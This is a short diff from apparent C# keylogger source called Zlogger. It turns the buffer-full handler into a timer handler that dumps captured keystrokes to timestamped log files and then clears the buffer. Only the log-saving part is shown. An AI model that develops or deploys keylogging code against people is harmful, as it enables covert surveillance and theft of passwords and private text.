@@ -34,12 +34,15 @@ namespace Rodjenihm.Zlogger
             }
         }
 
-        public static void HandleBufferFull(Keylogger keylogger)
+        public static void HandleIntervalElapsed(object sender, EventArgs e)
         {
+            var keylogger = sender as Keylogger;
+
             var logName = $"log_{DateTime.Now.ToString("yyyy-MM-dd HH-mm-ss")}.txt";
             var logPath = Path.Combine(keylogger.LogDir, logName);
-
             File.WriteAllText(logPath, keylogger.Buffer.ToString());
+
+            keylogger.Buffer.Clear();
         }
     }
 }
